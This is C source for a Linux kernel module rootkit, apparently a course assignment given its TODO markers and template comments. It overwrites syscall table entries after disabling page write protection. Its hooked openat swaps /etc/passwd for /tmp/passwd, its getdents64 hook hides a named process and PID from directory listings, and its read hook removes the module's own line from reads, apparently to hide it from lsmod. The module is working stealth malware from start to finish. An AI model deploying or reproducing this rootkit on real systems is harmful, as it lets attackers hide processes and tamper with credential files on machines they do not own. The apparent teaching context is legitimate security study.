#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// TODO:
static char * sneaky_pid = "\0";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "pid of sneaky process");

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
static asmlinkage int (*original_openat)(struct pt_regs * regs);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs * regs)
{
  // Implement the sneaky part here
  char buffer[12];
  const char * filename = (const char *) (regs->si);

  copy_from_user(buffer, filename, 12);
  if (strcmp(buffer, "/etc/passwd") == 0) {
    const char *modifiedFilename = "/tmp/passwd";
    copy_to_user((void *) filename, modifiedFilename, 12);
  }
  
  return (*original_openat)(regs);
}

// TODO: 下面基本全是
static asmlinkage int (*original_getdents64)(struct pt_regs * regs);

void remove_directory_entry(struct linux_dirent64 *entry, int nreads, int bpos) {
  // 计算需要移除的目录项的大小
  size_t entry_size = entry->d_reclen;
  size_t remaining_size = nreads - bpos - entry_size;

  // 计算需要移动的内存的起始地址和大小
  void *src = (void *)(((char *)entry) + entry_size);
  void *dest = (void *)entry;
  size_t move_size = remaining_size;

  // 移动目录项之后的内存数据，覆盖要移除的目录项
  memmove(dest, src, move_size);
}

asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
  struct linux_dirent64 * dirp;
  struct linux_dirent64 * d;
  int bpos;
  unsigned int count;
  char * buffer;
  int nreads = original_getdents64(regs);

  if (nreads <= 0) {
    return nreads;
  }
  
  // printk(KERN_INFO "Sneaky getdents64 begins.\n");

  dirp = (struct linux_dirent64 *) (regs->si);
  count = (unsigned int) (regs->dx);
  buffer = vmalloc(count);
  
  copy_from_user((void *) buffer, (void *) dirp, count);

  for (bpos=0; bpos < nreads;) {
    d = (struct linux_dirent64 *) (buffer + bpos);
    // printk(KERN_INFO "Sneaky %p %llu %s %4d\n", d, d->d_ino, d->d_name, d->d_reclen);
    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid) == 0) {
      // memmove((void *) d, (void *) (((char *) d) + d->d_reclen), nreads - bpos - d->d_reclen);
      remove_directory_entry(d, nreads, bpos);
      nreads -= d->d_reclen;
    } else {
      bpos += d->d_reclen;
    }
  }

  copy_to_user((void *) dirp, (void *) buffer, count);

  vfree(buffer);
  // printk(KERN_INFO "Sneaky getdents64 ends.\n");
  
  return nreads;
}

static asmlinkage ssize_t (*original_read)(struct pt_regs * regs);

ssize_t replace_line(char *buffer, ssize_t nreads, const char *target, const char *replacement) {
  char *line_start = NULL;
  char *new_line = NULL;

  line_start = strnstr(buffer, target, nreads);
  if (line_start != NULL) {
    new_line = strnstr(line_start, "\n", nreads - (line_start - buffer));
    if (new_line != NULL) {
      memmove(line_start, new_line + 1, (buffer + nreads - 1) - new_line);
      nreads -= (new_line - line_start + 1);
    } else {
      nreads = line_start - buffer;
    }
  }

  return nreads;
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
  char * buffer;
  void * buf;
  size_t count;
  ssize_t nreads = original_read(regs);
  
  if (nreads <= 0) {
    return nreads;
  }

  buf = (void *) (regs->si);
  count = (size_t) (regs->dx);
  buffer = (char *) vmalloc(count);

  copy_from_user((void *) buffer, buf, count);

  nreads = replace_line(buffer, nreads, "sneaky_mod ", "");

  copy_to_user(buf, (void *) buffer, count);
  
  vfree(buffer);

  return nreads;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded with sneaky_pid=%s.\n", sneaky_pid);

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *) sys_call_table[__NR_openat];
  // TODO:
  original_getdents64 = (void *) sys_call_table[__NR_getdents64];
  original_read = (void *) sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long) sneaky_sys_openat;
  // TODO:
  sys_call_table[__NR_getdents64] = (unsigned long) sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long) sneaky_sys_read;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}

static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long) original_openat;
  // TODO:
  sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
  sys_call_table[__NR_read] = (unsigned long) original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");
